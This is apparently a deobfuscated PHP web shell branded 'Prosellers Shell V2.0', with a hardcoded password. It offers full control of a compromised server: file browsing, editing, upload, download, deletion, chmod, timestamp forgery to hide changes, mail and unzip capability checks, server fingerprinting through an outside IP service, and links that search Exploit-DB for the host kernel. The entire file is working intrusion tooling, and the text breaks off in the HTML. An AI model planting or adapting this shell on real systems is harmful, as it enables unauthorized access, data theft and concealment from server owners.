<?php

session_start();
$auth_pass = "pro1234";
if (isset($_GET["checkpass"])) {
    header("Content-Type: application/json");
    $publicIp = @file_get_contents("http://api.ipify.org");
    echo json_encode(["status" => $_GET["checkpass"] === $auth_pass, "uname" => php_uname(), "php_version" => phpversion(), "ip" => $publicIp ? $publicIp : $_SERVER["SERVER_ADDR"] ?? gethostbyname(gethostname()), "user" => get_current_user()]);
    exit;
}
if (isset($_GET["checkmail"], $_GET["pass"])) {
    header("Content-Type: application/json");
    if ($_GET["pass"] !== $auth_pass) {
        echo json_encode(["status" => false]);
        exit;
    }
    $email = $_GET["checkmail"];
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        echo json_encode(["status" => false]);
        exit;
    }
    $itemid = "";
    if (isset($_GET["itemid"]) && $_GET["itemid"] !== "") {
        $raw = (string) $_GET["itemid"];
        if (preg_match("/^[a-zA-Z0-9_-]{1,128}\$/", $raw)) {
            $itemid = $raw;
        }
    }
    $subject = "Test Mail";
    $body = "This is a test mail from " . ($_SERVER["SERVER_NAME"] ?? "");
    if ($itemid !== "") {
        $subject .= " \xe2\x80\x94 Shell #" . $itemid;
        $body .= "\r\n\r\nShell ID: " . $itemid;
    }
    $sent = @mail($email, $subject, $body);
    $out = ["status" => $sent];
    if ($itemid !== "") {
        $out["itemid"] = $itemid;
    }
    echo json_encode($out);
    exit;
}
if (isset($_GET["checkunzip"], $_GET["pass"])) {
    header("Content-Type: application/json");
    if ($_GET["pass"] !== $auth_pass) {
        echo json_encode(["status" => false]);
        exit;
    }
    $hasUnzip = false;
    if (class_exists("ZipArchive")) {
        $hasUnzip = true;
    } else {
        $paths = ["/usr/bin/unzip", "/bin/unzip", "/usr/local/bin/unzip", "/sbin/unzip"];
        foreach ($paths as $p) {
            if (@file_exists($p) && @is_executable($p)) {
                $hasUnzip = true;
                break;
            }
        }
    }
    echo json_encode(["status" => $hasUnzip]);
    exit;
}
if (isset($_GET["logout"])) {
    session_destroy();
    header("Location: ?");
    exit;
}
if (isset($_POST["pass"]) && $_POST["pass"] === $auth_pass) {
    $_SESSION["logged_in"] = true;
}
if (empty($_SESSION["logged_in"])) {
    ?>
<!DOCTYPE html>
<html>
<head>
<title>Prosellers Shell V2.0 Login</title>
<style>
body { background: #0f1115; color: #94a3b8; font-family: 'Inter', sans-serif; display: flex; height: 100vh; align-items: center; justify-content: center; margin: 0; }
.login-box { background: #1f2937; padding: 40px; border-radius: 12px; border: 1px solid #374151; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.5); text-align: center; width: 300px; }
h2 { color: #f3f4f6; margin-top: 0; }
input { width: 100%; padding: 10px; margin: 15px 0; background: #111827; border: 1px solid #374151; color: #fff; border-radius: 6px; box-sizing: border-box; }
button { width: 100%; padding: 10px; background: #10b981; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; transition: background 0.2s; }
button:hover { background: #059669; }
</style>
</head>
<body>
<div class="login-box">
    <h2>Login</h2>
    <form method="post">
        <input type="password" name="pass" placeholder="Password" required autofocus>
        <button type="submit">Access Shell</button>
    </form>
</div>
</body>
</html>
<?php 
    exit;
}
@ini_set("memory_limit", "512M");
@set_time_limit(0);
$rootPath = realpath("/");
$currentPath = isset($_GET["path"]) ? realpath($_GET["path"]) : realpath("/home/scarface/Documents/github/PHPDeobfuscator");
if (!$currentPath) {
    $currentPath = realpath("/home/scarface/Documents/github/PHPDeobfuscator");
}
function p($path)
{
    return htmlspecialchars($path);
}
function icon($name)
{
    $icons = ["folder" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z\"></path></svg>", "file" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z\"></path><polyline points=\"13 2 13 9 20 9\"></polyline></svg>", "upload" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4\"></path><polyline points=\"17 8 12 3 7 8\"></polyline><line x1=\"12\" y1=\"3\" x2=\"12\" y2=\"15\"></line></svg>", "plus" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><line x1=\"12\" y1=\"5\" x2=\"12\" y2=\"19\"></line><line x1=\"5\" y1=\"12\" x2=\"19\" y2=\"12\"></line></svg>", "trash" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><polyline points=\"3 6 5 6 21 6\"></polyline><path d=\"M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2\"></path></svg>", "search" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><circle cx=\"11\" cy=\"11\" r=\"8\"></circle><line x1=\"21\" y1=\"21\" x2=\"16.65\" y2=\"16.65\"></line></svg>", "edit" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7\"></path><path d=\"M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z\"></path></svg>", "home" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z\"></path><polyline points=\"9 22 9 12 15 12 15 22\"></polyline></svg>", "terminal" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><polyline points=\"4 17 10 11 4 5\"></polyline><line x1=\"12\" y1=\"19\" x2=\"20\" y2=\"19\"></line></svg>", "download" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4\"></path><polyline points=\"7 10 12 15 17 10\"></polyline><line x1=\"12\" y1=\"15\" x2=\"12\" y2=\"3\"></line></svg>", "chevron-right" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><polyline points=\"9 18 15 12 9 6\"></polyline></svg>", "server" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><rect x=\"2\" y=\"2\" width=\"20\" height=\"8\" rx=\"2\" ry=\"2\"></rect><rect x=\"2\" y=\"14\" width=\"20\" height=\"8\" rx=\"2\" ry=\"2\"></rect><line x1=\"6\" y1=\"6\" x2=\"6.01\" y2=\"6\"></line><line x1=\"6\" y1=\"18\" x2=\"6.01\" y2=\"18\"></line></svg>", "archive" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><polyline points=\"21 8 21 21 3 21 3 8\"></polyline><rect x=\"1\" y=\"3\" width=\"22\" height=\"5\"></rect><line x1=\"10\" y1=\"12\" x2=\"14\" y2=\"12\"></line></svg>", "clock" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><circle cx=\"12\" cy=\"12\" r=\"10\"></circle><polyline points=\"12 6 12 12 16 14\"></polyline></svg>", "lock" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><rect x=\"3\" y=\"11\" width=\"18\" height=\"11\" rx=\"2\" ry=\"2\"></rect><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"></path></svg>", "menu" => "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><line x1=\"3\" y1=\"12\" x2=\"21\" y2=\"12\"></line><line x1=\"3\" y1=\"6\" x2=\"21\" y2=\"6\"></line><line x1=\"3\" y1=\"18\" x2=\"21\" y2=\"18\"></line></svg>"];
    return $icons[$name] ?? "";
}
$serverInfo = null;
if (isset($_GET["view"]) && $_GET["view"] === "server_info") {
    $hddTotal = @disk_total_space($rootPath);
    $hddFree = @disk_free_space($rootPath);
    $hddTotalGB = $hddTotal ? round($hddTotal / 1073741824, 2) : 0;
    $hddFreeGB = $hddFree ? round($hddFree / 1073741824, 2) : 0;
    $hddPercent = $hddTotalGB > 0 ? round($hddFreeGB / $hddTotalGB * 100, 2) : 0;
    $serverInfo = ["Uname" => php_uname(), "User" => get_current_user() . " (" . getmyuid() . ") Group: " . get_current_user() . " (" . getmygid() . ")", "Php" => phpversion() . " Safe mode: " . (ini_get("safe_mode") ? "ON" : "OFF"), "Hdd" => "{$hddTotalGB} GB Free: {$hddFreeGB} GB ({$hddPercent}%)", "Software" => $_SERVER["SERVER_SOFTWARE"] ?? "Unknown"];
}
if (isset($_GET["action"]) && $_GET["action"] === "phpinfo") {
    phpinfo();
    exit;
}
if (isset($_POST["create"], $_POST["name"])) {
    $newPath = $currentPath . "/" . basename($_POST["name"]);
    if (!file_exists($newPath)) {
        if ($_POST["create"] === "folder") {
            mkdir($newPath, 0755);
        } else {
            file_put_contents($newPath, "");
        }
        header("Location: ?path=" . urlencode($currentPath) . "&msg=created");
        exit;
    }
}
if (isset($_POST["content"], $_POST["file"])) {
    $file = realpath($_POST["file"]);
    if ($file && is_writable($file)) {
        file_put_contents($file, $_POST["content"]);
        header("Location: ?path=" . urlencode($currentPath) . "&msg=saved");
        exit;
    }
}
if (isset($_POST["upload"]) && isset($_FILES["uploads"])) {
    foreach ($_FILES["uploads"]["tmp_name"] as $key => $tmp_name) {
        $name = basename($_FILES["uploads"]["name"][$key]);
        move_uploaded_file($tmp_name, $currentPath . "/" . $name);
    }
    header("Location: ?path=" . urlencode($currentPath) . "&msg=uploaded");
    exit;
}
if (isset($_POST["action"]) && $_POST["action"] === "rename" && isset($_POST["oldname"], $_POST["newname"])) {
    $old = realpath($currentPath . "/" . $_POST["oldname"]);
    $new = $currentPath . "/" . basename($_POST["newname"]);
    if ($old && $old !== $new) {
        rename($old, $new);
        header("Location: ?path=" . urlencode($currentPath));
        exit;
    }
}
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["action"]) && $_POST["action"] === "delete") {
    $selected = $_POST["selected_files"] ?? [];
    foreach ($selected as $f) {
        $target = realpath($currentPath . DIRECTORY_SEPARATOR . $f);
        if (!$target) {
            continue;
        }
        if (is_file($target)) {
            @unlink($target);
        } elseif (is_dir($target)) {
            @rmdir($target);
        }
    }
    header("Location: ?path=" . urlencode($currentPath) . "&msg=deleted");
    exit;
}
if (isset($_GET["download"])) {
    $file = realpath($_GET["download"]);
    if ($file && is_file($file)) {
        header("Content-Description: File Transfer");
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"" . basename($file) . "\"");
        header("Expires: 0");
        header("Cache-Control: must-revalidate");
        header("Pragma: public");
        header("Content-Length: " . filesize($file));
        readfile($file);
        exit;
    }
}
if (isset($_POST["action"]) && $_POST["action"] === "unzip" && isset($_POST["file"])) {
    $zipFile = realpath($currentPath . "/" . $_POST["file"]);
    if ($zipFile && is_file($zipFile) && extension_loaded("zip")) {
        $zip = new ZipArchive();
        if ($zip->open($zipFile) === TRUE) {
            $zip->extractTo($currentPath);
            $zip->close();
            header("Location: ?path=" . urlencode($currentPath) . "&msg=unzipped");
            exit;
        } else {
            echo "<script>alert('Failed to open zip file');</script>";
        }
    }
}
if (isset($_POST["action"]) && $_POST["action"] === "touch" && isset($_POST["file"], $_POST["datetime"])) {
    $target = realpath($currentPath . "/" . $_POST["file"]);
    $time = strtotime($_POST["datetime"]);
    if ($target && $time) {
        if (@touch($target, $time)) {
            header("Location: ?path=" . urlencode($currentPath) . "&msg=date_changed");
            exit;
        } else {
            echo "<script>alert('Failed to change date');</script>";
        }
    }
}
if (isset($_POST["action"]) && $_POST["action"] === "chmod" && isset($_POST["file"], $_POST["perms"])) {
    $target = realpath($currentPath . "/" . $_POST["file"]);
    $perms = intval($_POST["perms"], 8);
    if ($target && $perms) {
        if (@chmod($target, $perms)) {
            header("Location: ?path=" . urlencode($currentPath) . "&msg=perms_changed");
            exit;
        } else {
            echo "<script>alert('Failed to change permissions');</script>";
        }
    }
}
$isEditMode = isset($_GET["edit"]) && is_file($_GET["edit"]);
$editFile = $isEditMode ? realpath($_GET["edit"]) : null;
$editContent = $editFile ? htmlspecialchars(file_get_contents($editFile)) : "";
$files = [];
if (is_dir($currentPath)) {
    $raw = @scandir($currentPath);
    if ($raw) {
        foreach ($raw as $item) {
            if ($item === ".") {
                continue;
            }
            $path = $currentPath . DIRECTORY_SEPARATOR . $item;
            $isDir = is_dir($path);
            $files[] = ["name" => $item, "path" => $path, "type" => $isDir ? "dir" : "file", "size" => $isDir ? "-" : (is_readable($path) ? round(filesize($path) / 1024, 2) . " KB" : "???"), "perms" => ($p = @fileperms($path)) ? substr(sprintf("%o", $p), -4) : "????", "mtime" => @filemtime($path) ?: 0];
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prosellers Shell V2.0</title>
    <style>
        :root {
            --bg-body: #0f1115;
            --bg-sidebar: #161b22;
            --bg-card: #1f2937;
            --bg-hover: #374151;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
            --accent: #10b981;
            --accent-hover: #059669;
            --danger: #ef4444;
            --border: #374151;
        }
        * { box-sizing: border-box; outline: none; }
        body { margin: 0; font-family: 'Inter', system-ui, -apple-system, sans-serif; background: var(--bg-body); color: var(--text-main); font-size: 14px; display: flex; height: 100vh; overflow: hidden; }
        a { text-decoration: none; color: inherit; transition: 0.2s; }
        
        /* Sidebar */
        .sidebar { width: 250px; background: var(--bg-sidebar); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 20px; flex-shrink: 0; }
        .brand { font-size: 18px; font-weight: bold; color: var(--accent); margin-bottom: 30px; display: flex; align-items: center; gap: 10px; }
        .nav-link { display: flex; align-items: center; gap: 10px; padding: 12px; border-radius: 8px; color: var(--text-muted); margin-bottom: 5px; }
        .nav-link:hover, .nav-link.active { background: var(--bg-card); color: var(--text-main); }
        .nav-link svg { opacity: 0.8; }
        
        /* Main Content */
        .main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
        .header { height: 60px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; background: var(--bg-sidebar); }
        .breadcrumbs { display: flex; align-items: center; gap: 8px; color: var(--text-muted); overflow: hidden; white-space: nowrap; }
        .breadcrumbs a:hover { color: var(--accent); }
        .breadcrumb-sep { opacity: 0.4; }
        
        .toolbar { padding: 20px; display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
        .btn { border: none; padding: 8px 16px; border-radius: 6px; font-weight: 500; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; font-size: 13px; transition: 0.2s; }
        .btn-primary { background: var(--accent); color: white; }
        .btn-primary:hover { background: var(--accent-hover); }
        .btn-secondary { background: var(--bg-card); color: var(--text-main); border: 1px solid var(--border); }
        .btn-secondary:hover { background: var(--bg-hover); }
        .btn-danger { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid transparent; }
        .btn-danger:hover { background: rgba(239, 68, 68, 0.2); }
        
        /* File List */
        .content-area { flex: 1; overflow-y: auto; padding: 0 20px 20px 20px; }
        .file-table { width: 100%; border-collapse: collapse; }
        .file-table th { text-align: left; padding: 12px; color: var(--text-muted); font-weight: 500; border-bottom: 1px solid var(--border); position: sticky; top: 0; background: var(--bg-body); z-index: 10; }
        .file-table td { padding: 12px; border-bottom: 1px solid var(--border); color: var(--text-main); }
        .file-table tr:hover { background: rgba(255,255,255,0.02); }
        .file-icon { color: var(--accent); display: flex; align-items: center; }
        .file-icon.file { color: var(--text-muted); }
        .name-cell { display: flex; align-items: center; gap: 10px; font-weight: 500; }
        
        /* Forms & Inputs */
        input[type="text"], textarea { background: var(--bg-card); border: 1px solid var(--border); color: var(--text-main); padding: 8px 12px; border-radius: 6px; width: 100%; }
        input:focus, textarea:focus { border-color: var(--accent); }
        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); display: none; align-items: center; justify-content: center; z-index: 100; backdrop-filter: blur(2px); }
        .modal { background: var(--bg-sidebar); padding: 25px; border-radius: 12px; width: 400px; max-width: 90%; border: 1px solid var(--border); box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        .modal h3 { margin-top: 0; color: var(--text-main); }
        
        /* Utilities */
        .badge { padding: 4px 8px; border-radius: 4px; background: var(--bg-card); font-size: 11px; }
        .actions { display: flex; gap: 8px; }
        .icon-btn { padding: 6px; border-radius: 4px; color: var(--text-muted); cursor: pointer; border: none; background: transparent; }
        .icon-btn:hover { background: var(--bg-hover); color: var(--text-main); }
        
        /* Editor */
        .editor-container { height: 100%; display: flex; flex-direction: column; }
        .editor-textarea { flex: 1; font-family: 'Menlo', 'Monaco', 'Courier New', monospace; font-size: 13px; line-height: 1.5; resize: none; border: 1px solid var(--border); background: #0d1117; color: #c9d1d9; padding: 15px; }

        /* Mobile Responsiveness */
        #menu-btn { display: none; background: none; border: none; color: var(--text-primary); cursor: pointer; margin-bottom: 20px; }
        .mobile-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 900; display: none; }
        
        @media (max-width: 768px) {
            body { font-size: 13px; }
            #menu-btn { display: block; }
            .sidebar { position: fixed; left: -260px; top: 0; bottom: 0; width: 260px; z-index: 1000; transition: left 0.3s ease; box-shadow: 2px 0 10px rgba(0,0,0,0.5); border-right: 1px solid var(--border); }
            .sidebar.open { left: 0; }
            .mobile-overlay.open { display: block; }
            .main { padding: 10px; width: 100%; }
            .table-container { overflow-x: auto; }
            table { min-width: 500px; }
            .modal { width: 95%; padding: 15px; }
            .toolbar { flex-wrap: nowrap; gap: 5px; overflow-x: auto; padding-bottom: 5px; }
            .toolbar button { padding: 6px 8px; font-size: 12px; white-space: nowrap; flex: 0 0 auto; }
            .toolbar div[style*="flex:1"] { display: none; } 
            
            /* Header Mobile */
            .header { padding: 0 10px; gap: 10px; }
            .breadcrumbs { flex: 1; overflow-x: auto; font-size: 12px; margin: 0; min-width: 0; -webkit-overflow-scrolling: touch; }
            .breadcrumbs > * { flex-shrink: 0; }
            .badge { font-size: 10px; padding: 4px 6px; white-space: nowrap; }
        }
    </style>
</head>
<body>

<div class="mobile-overlay" onclick="toggleSidebar()"></div>

<!-- SIDEBAR -->
<div class="sidebar">
    <div class="brand">
        <?php 
echo icon("terminal");
?>
        <span>ProShell v2.0</span>
    </div>
    <a href="?path=<?php 
echo urlencode($rootPath);
?>" class="nav-link <?php 
echo !isset($_GET["view"]) && !isset($_GET["edit"]) ? "active" : "";
?>">
        <?php 
echo icon("home");
?> Dashboard
    </a>
    <a href="?view=server_info" class="nav-link <?php 
echo isset($_GET["view"]) && $_GET["view"] === "server_info" ? "active" : "";
?>">
        <?php 
echo icon("server");
?> Server Info
    </a>
    <div style="margin-top:auto; font-size: 11px; color: var(--text-muted);">
        Server: <?php 
echo $_SERVER["SERVER_ADDR"] ?? "Unknown";
?><br>
        PHP: <?php 
echo phpversion();
?>
    </div>
</div>

<!-- MAIN CONTENT -->
<div class="main">
    
    <!-- TOP BAR -->
    <div class="header">
        <button id="menu-btn" onclick="toggleSidebar()"><?php 
echo icon("menu");
?></button>
        <div class="breadcrumbs">
            <?php 
$parts = explode(DIRECTORY_SEPARATOR, $currentPath);
$builtPath = "";
foreach ($parts as $i => $part) {
    if ($part === "") {
        continue;
    }
    $builtPath .= DIRECTORY_SEPARATOR . $part;
    echo "<a href=\"?path=" . urlencode($builtPath) . "\">" . $part . "</a>";
    if ($i < count($parts) - 1) {
        echo "<span class=\"breadcrumb-sep\">" . icon("chevron-right") . "</span>";
    }
}
if ($currentPath === DIRECTORY_SEPARATOR) {
    echo "<a href=\"?path=%2F\">/</a>";
}
?>
        </div>
        <div>
            <span class="badge"><?php 
echo date("Y-m-d H:i:s");
?></span>
        </div>
    </div>

    <!-- CONTENT -->
    <div class="content-area">
        
        <?php 
if ($serverInfo) {
    ?>
            <!-- SERVER INFO VIEW -->
            <div style="padding: 20px 0;">
                <h3 style="display:flex; align-items:center; gap:10px;"><?php 
    echo icon("server");
    ?> Server Information</h3>
                
                <div style="background: var(--bg-card); border-radius: 8px; border: 1px solid var(--border); overflow: hidden; font-family: monospace; font-size: 13px;">
                    <div style="padding: 15px; border-bottom: 1px solid var(--border);">
                        <div style="color: var(--text-muted); margin-bottom: 4px;">Uname:</div>
                        <div style="color: var(--accent);"><?php 
    echo $serverInfo["Uname"];
    ?> 
                            <span style="color: var(--text-muted); margin-left:10px;">[ <a href="https://www.google.com/search?q=<?php 
    echo urlencode($serverInfo["Uname"] . " exploit");
    ?>" target="_blank" style="text-decoration: underline;">Google</a> ] [ <a href="https://www.exploit-db.com/search?q=<?php 
    echo urlencode($serverInfo["Uname"]);
    ?>" target="_blank" style="text-decoration: underline;">Exploit-DB</a> ]</span>
                        </div>
                    </div>
                    
                    <div style="padding: 15px; border-bottom: 1px solid var(--border);">
                         <div style="color: var(--text-muted); margin-bottom: 4px;">User:</div>
                         <div><?php 
    echo $serverInfo["User"];
    ?></div>
                    </div>
                    
                    <div style="padding: 15px; border-bottom: 1px solid var(--border);">
                        <div style="color: var(--text-muted); margin-bottom: 4px;">Php:</div>
                        <div>
                            <?php 
    echo $serverInfo["Php"];
    ?> 
                            [ <a href="?action=phpinfo" target="_blank" style="color: var(--accent); text-decoration: underline;">phpinfo</a> ] 
                            Datetime: <?php 
    echo date("Y-m-d H:i:s");
    ?>
                        </div>
                    </div>
                    
                    <div style="padding: 15px;">
                        <div style="color: var(--text-muted); margin-bottom: 4px;">Hdd:</div>
                        <div style="display:flex; align-items:center; gap:15px;">
                            <span><?php 
    echo $serverInfo["Hdd"];
    ?></span>
                            <div style="flex:1; max-width: 200px; height: 6px; background: #374151; border-radius: 3px; overflow:hidden;">
                                <div style="height:100%; width: <?php 
    echo floatval($serverInfo["HddPercent"] ?? 0);
    ?>%; background: var(--accent);"></div>
                            </div>
                        </div>
                    </div>
                </div>

                <div style="margin-top: 20px;">
                    <h4 style="color: var(--text-muted); margin-bottom: 10px;">Software</h4>
                    <div style="background: var(--bg-card); padding: 10px 15px; border-radius: 6px; border: 1px solid var(--border); font-family: monospace;">
                        <?php 
    echo htmlspecialchars($serverInfo["Software"]);
    ?>
                    </div>
                </div>

                <br>
                <a href="?path=<?php 
    echo urlencode($currentPath);
    ?>" class="btn btn-secondary">Back to Files</a>
            </div>

        <?php 
} elseif ($isEditMode) {
    ?>
            <!-- EDITOR VIEW -->
            <form method="post" class="editor-container" style="padding: 20px 0; height: calc(100vh - 100px);">
                <div style="margin-bottom: 10px; display: flex; justify-content: space-between;">
                    <h3 style="margin:0;">Editing: <?php 
    echo basename($editFile);
    ?></h3>
                    <div class="actions">
                        <a href="?path=<?php 
    echo urlencode(dirname($editFile));
    ?>" class="btn btn-secondary">Cancel</a>
                        <button type="submit" class="btn btn-primary">Save Changes</button>
                    </div>
                </div>
                <input type="hidden" name="file" value="<?php 
    echo p($editFile);
    ?>">
                <textarea name="content" class="editor-textarea"><?php 
    echo $editContent;
    ?></textarea>
            </form>

        <?php 
} else {
    ?>
            <!-- FILE MANAGER VIEW -->
            
            <!-- TOOLBAR -->
            <div class="toolbar" style="padding: 20px 0;">
                <button onclick="document.getElementById('uploadModal').style.display='flex'" class="btn btn-primary"><?php 
    echo icon("upload");
    ?> Upload</button>
                <button onclick="openCreateModal('file')" class="btn btn-secondary"><?php 
    echo icon("plus");
    ?> New File</button>
                <button onclick="openCreateModal('folder')" class="btn btn-secondary"><?php 
    echo icon("folder");
    ?> New Folder</button>
                <div style="flex:1"></div>
                <button type="button" onclick="confirmDelete()" class="btn btn-danger"><?php 
    echo icon("trash");
    ?> Delete Selected</button>
            </div>

            <!-- FILE TABLE -->
            <form method="post" id="deleteForm">
                <input type="hidden" name="action" value="delete">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th width="30"><input type="checkbox" onclick="toggleSelectAll(this)"></th>
                            <th>Name</th>
                            <th width="100">Size</th>
                            <th width="80">Perms</th>
                            <th width="140">Date</th>
                            <th width="160">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <!-- Go Up Link -->
                        <?php 
    if ($currentPath !== $rootPath) {
        ?>
                        <tr>
                            <td></td>
                            <td colspan="4">
                                <a href="?path=<?php 
        echo urlencode(dirname($currentPath));
        ?>" class="name-cell">
                                    <span class="file-icon"><?php 
        echo icon("folder");
        ?></span> ..
                                </a>
                            </td>
                        </tr>
                        <?php 
    }
    ?>

                        <?php 
    foreach ($files as $f) {
        ?>
                        <tr>
                            <td><input type="checkbox" name="selected_files[]" value="<?php 
        echo p($f["name"]);
        ?>"></td>
                            <td>
                                <a href="<?php 
        echo $f["type"] === "dir" ? "?path=" . urlencode($f["path"]) : "?edit=" . urlencode($f["path"]);
        ?>" class="name-cell">
                                    <span class="file-icon <?php 
        echo $f["type"];
        ?>"><?php 
        echo icon($f["type"] === "dir" ? "folder" : "file");
        ?></span>
                                    <?php 
        echo p($f["name"]);
        ?>
                                </a>
                            </td>
                            <td><?php 
        echo $f["size"];
        ?></td>
                            <td><span class="badge"><?php 
        echo $f["perms"];
        ?></span></td>
                            <td style="font-size: 11px; color: var(--text-muted);"><?php 
        echo date("Y-m-d H:i", $f["mtime"]);
        ?></td>
                            <td>
                                <div class="actions">
                                    <button type="button" class="icon-btn" onclick="renameItem('<?php 
        echo p($f["name"]);
        ?>')" title="Rename"><?php 
        echo icon("edit");
        ?></button>
                                    <button type="button" class="icon-btn" onclick="touchItem('<?php 
        echo p($f["name"]);
        ?>', '<?php 
        echo date("Y-m-d\\TH:i", $f["mtime"]);
        ?>')" title="Change Date"><?php 
        echo icon("clock");
        ?></button>
                                    <button type="button" class="icon-btn" onclick="chmodItem('<?php 
        echo p($f["name"]);
        ?>', '<?php 
        echo $f["perms"];
        ?>')" title="Chmod"><?php 
        echo icon("lock");
        ?></button>
                                    <?php 
        if ($f["type"] !== "dir") {
            ?>
                                        <a href="?download=<?php 
            echo urlencode($f["path"]);
            ?>" class="icon-btn" title="Download"><?php 
            echo icon("download");
            ?></a>
                                        <?php 
            if (strtolower(pathinfo($f["name"], PATHINFO_EXTENSION)) === "zip" && extension_loaded("zip")) {
                ?>
                                            <button type="button" class="icon-btn" onclick="unzipItem('<?php 
                echo p($f["name"]);
                ?>')" title="Unzip"><?php 
                echo icon("archive");
                ?></button>
                                        <?php 
            }
            ?>
                                    <?php 
        }
        ?>
                                </div>
                            </td>
                        </tr>
                        <?php 
    }
    ?>
                        
                         <!-- Home Text Link at Bottom -->
                        <tr>
                            <td colspan="5" style="text-align: center; padding: 20px;">
                                <a href="?path=<?php 
    echo urlencode(realpath("/home/scarface/Documents/github/PHPDeobfuscator"));
    ?>" class="btn btn-secondary" style="display: inline-flex; width: auto; justify-content: center;">
                                    <?php 
    echo icon("home");
    ?> Home Directory
                                </a>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </form>
        <?php 
}
?>
    </div>
</div>

<!-- MODALS -->

<!-- Upload Modal -->
